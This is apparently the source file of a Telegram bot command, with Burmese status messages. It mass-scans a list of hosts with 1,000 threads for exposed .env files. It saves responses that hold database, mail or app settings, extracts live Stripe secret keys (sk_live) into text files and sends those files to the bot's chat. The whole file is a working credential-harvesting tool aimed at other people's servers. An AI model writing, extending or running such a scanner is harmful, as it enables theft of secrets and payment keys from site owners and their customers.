import re
import sys
import os
import time
import socket
import urllib3
import json
import os.path
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from httplib2 import Http
from bot import LOGGER
from json import loads
from bot.config import Messages
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot.config import BotCommands

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LBLUE = '\033[38;2;66;165;245m'
    GREY = '\033[38;2;158;158;158m'
class ENV :
   def scan (self, url):
      rr = ''
      proto =''
      mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=','sk_live', 'APP_ENV=']
      try:
         r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
         if r.status_code ==200:
            resp = r.text
            if any(key in resp for key in mch):
               rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : http://{url}'
               with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                  output.write(f'{resp}\n')
               if "sk_live" in resp:
                  file_object = open('SK_ENV.TXT', 'a')
                  file_object.write(f'ENV : {url}\n')
                  file_object.close()
               lin = resp.splitlines( )
               for x in lin:
                  if "sk_live" in x:
                     file_object = open('SK_LIVE.TXT', 'a')
                     file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                     file_object.close()
            else :
               rr = 'RE'
         else :
            rr = 'RE'
      except :
         rr='RE'
      if 'RE' in rr :
         try:
            proto = 'https'
            r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
            if r.status_code ==200:
               resp = r.text
               if any(key in resp for key in mch):
                  rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
                  with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                     output.write(f'{resp}\n')
                  if "sk_live" in resp:
                     file_object = open('SK_ENV.TXT', 'a')
                     file_object.write(f'ENV : {url}\n')
                     file_object.close()
                  lin = resp.splitlines( )
                  for x in lin:
                     if "sk_live" in x:
                        file_object = open('SK_LIVE.TXT', 'a')
                        file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
                        file_object.close()
               else:
                  rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
            else:
               rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
         except :
            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
      #print(rr+'/.env')

@Client.on_message(filters.private & filters.incoming & filters.command(BotCommands.Env))

async def reverse(client, message):
    chat_id = message.chat.id
    env = message.text.split()[-1]
    editable = await client.send_message(chat_id,f"သင်ပေးပို့လာသော {env} မှ အင်တာနက် လိပ်စာများကိုထုတ်ယူနေပါသည်")
    if not os.path.isdir("ENVS"):
      os.makedirs("ENVS")
    threads = [1000]
    
    with open(f"{env}" + "-ipv4.txt") as urlList:
        argFile = urlList.read().splitlines()
 
   
    with ThreadPoolExecutor(max_workers=1000) as executor:
      for data in argFile:
        threads.append(executor.submit(ENV().scan, data))
    if os.path.exists("SK_LIVE.TXT"):
        await client.send_document(chat_id, f"SK_LIVE.TXT")
        await client.send_document(chat_id, f"SK_ENV.TXT")
    else:
       await editable.edit("ဘာ SK မှ မတွေ့ပါ")